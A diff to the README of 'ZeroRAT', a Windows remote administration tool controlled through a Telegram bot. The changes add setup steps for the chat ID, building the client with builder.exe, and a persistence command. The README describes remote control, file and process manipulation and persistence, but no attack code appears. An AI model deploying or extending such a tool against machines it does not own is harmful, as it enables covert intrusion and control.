@@ -4,6 +4,10 @@
 
 ZeroRAT is a powerful remote administration tool (RAT) designed for Windows systems. It allows remote control via a Telegram bot, offering functionalities such as system monitoring, file manipulation, process control, and persistence mechanisms.
 
+
+![screenshot](https://github.com/jfrzz/ZeroTrace/blob/main/assets/image.png)
+
+
 ## Features
 
 - **System Information Retrieval**: Fetch CPU, RAM, OS version, and network details.
@@ -37,14 +41,27 @@ ZeroRAT is a powerful remote administration tool (RAT) designed for Windows syst
    pip install -r requirements.txt
    ```
 
-3. Set up your Telegram bot token in `ZeroRAT.py`:
-   ```python
-   BOT_TOKEN = "your_telegram_bot_token"
-   ```
+3. **Find Your Telegram Chat ID** (Required to Receive Messages from the Bot):
+   - Open Telegram and search for **`@userinfobot`**.
+   - Start the bot by sending **`/start`**.
+   - It will reply with your **chat ID** (e.g., `123456789`).
+   - Copy this chat id and modify the **precompiled/ZeroRAT.py** and find this line :
+   
+     ```sh
+     CHAT_ID = ""
+     ```
+     
+   - Paste your **chat ID**:
+     
+     ```sh
+     CHAT_ID = "123456789"
+     ```
+     
+   - Save the file
 
-4. Run the bot:
+4. Run the builder and enter your Telegram bot token:
    ```sh
-   python ZeroRAT.py
+   builder.exe
    ```
 
 ## Usage
@@ -71,6 +88,8 @@ After starting the bot, use the following commands in your Telegram chat:
 ### Persistence
 - `/persistentkit` - Enable persistence.
 - `/removepersistence` - Remove persistence.
+
+**For the full list of commands run : `/help`**
 
 ## Security & Ethical Usage
 
